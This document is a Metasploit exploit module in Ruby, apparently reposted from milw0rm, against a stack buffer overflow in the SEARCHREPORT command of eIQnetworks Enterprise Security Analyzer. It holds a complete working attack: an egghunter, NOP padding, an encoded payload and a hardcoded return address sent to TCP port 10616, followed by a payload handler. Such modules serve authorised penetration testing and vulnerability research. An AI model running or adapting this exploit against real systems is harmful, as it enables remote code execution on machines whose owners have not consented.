##
# $Id: eiqnetworks_esa.rb 4529 2007-03-12 01:08:18Z hdm $
##

##
# This file is part of the Metasploit Framework and may be subject to 
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/projects/Framework/
##


require 'msf/core'

module Msf

class Exploits::Windows::Misc::Eiqnetworks_SEARCHREPORT < Msf::Exploit::Remote

	include Exploit::Remote::Tcp
	include Exploit::Remote::Egghunter

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'eIQNetworks ESA SEARCHREPORT Overflow',
			'Description'    => %q{
				This module exploits a stack overflow in eIQnetworks
				Enterprise Security Analyzer. During the processing of
				long arguments to the SEARCHREPORT command, a stack-based
				buffer overflow occurs. 
			},
			'Author'         => [ 'ri0t <ri0t[at]ri0tnet.net>',   ],
			'Version'        => '$Revision: 4529 $',
			'References'     => 
				[
				],
			'DefaultOptions' =>
				{
					'EXITFUNC' => 'seh',
				},
			'Payload'        =>
				{
					'Space'    => 1962,
					'BadChars' => "\x00",
					'ActiveTimeout' => 15,
				},
			'Platform'       => 'win',
			
			'Targets'        =>
				[
					['EnterpriseSecurityAnalyzer v2.5 Universal', { 'Ret' => 0x55322a6a, 'Offset' => 1962 } ],  
				
				],

			'Privileged'     => false,

                        'DisclosureDate' => ''

                        ))

			register_options(
			[
				Opt::RPORT(10616)
			], self.class)
	end

	def exploit
		connect

		print_status("Trying target #{target.name}...")
	
		hunter = generate_egghunter()
		egg = hunter[1]
		filler =  make_nops(target['Offset'] - payload.encoded.length)
		sploit =  "SEARCHREPORT&" + egg + egg + filler + payload.encoded + make_nops(12) + [target.ret].pack('V') + make_nops(12) + hunter[0] +  "&";
		puts sploit
		sock.put(sploit)
		handler
		disconnect	
	end

end
end

# milw0rm.com [2007-10-24]
